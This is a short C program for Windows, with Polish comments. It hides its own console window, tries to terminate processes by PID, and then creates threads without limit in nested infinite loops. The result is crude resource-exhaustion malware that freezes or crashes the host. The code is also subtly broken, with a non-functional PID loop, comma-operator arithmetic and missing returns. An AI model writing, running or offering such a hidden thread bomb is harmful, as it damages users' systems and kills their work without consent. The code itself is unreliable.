#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h> 
#include <windows.h>
#define WIN32_WINNT 0x0500

void kill_by_pid()//for kill all process (alpha)BRAK EFEKTYWNOSCI w pętli inny sposób szukania pida
{
	int a=0;
	while(a++);
	HANDLE handy;
	handy =OpenProcess(SYNCHRONIZE|PROCESS_TERMINATE, TRUE, a);
	TerminateProcess(handy,0);
}

void *bad() {
	long double a;
	
	a=999999,9999*a;
	printf("\rcokolwiek");
	}

void *badguy() {
	long double a;
	
	a=999999,9999*a;
	printf("\rcokolwiek");
	}
void *badguy2() {
	long double a;
	
	a=999999,9999*a;
	printf("\rcokolwiek");
	}
void *badguy3() {
	long double a;
	while(1){
    pthread_t bad_thread;
	int result = pthread_create(&bad_thread, NULL, bad, NULL);	
	}
	a=999999,9999*a;
	printf("\rcokolwiek");
	}


void *badman() {
	while(1){
    pthread_t badguy_thread;
	int result = pthread_create(&badguy_thread, NULL, badguy, NULL);
	pthread_t badguy2_thread;
	int result2 = pthread_create(&badguy2_thread, NULL, badguy2, NULL);
    pthread_t badguy3_thread;
	int result3 = pthread_create(&badguy3_thread, NULL, badguy3, NULL);
	if (result != 0) {
        perror("Could not create thread.");
    	}
	9*99;
	}
}
	


int main(){   

    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );
	kill_by_pid();
    while(1){
    pthread_t badman_thread;
	int result = pthread_create(&badman_thread, NULL, badman, NULL);
	if (result != 0) {
        perror("Could not create thread.");
    	}
	}
}
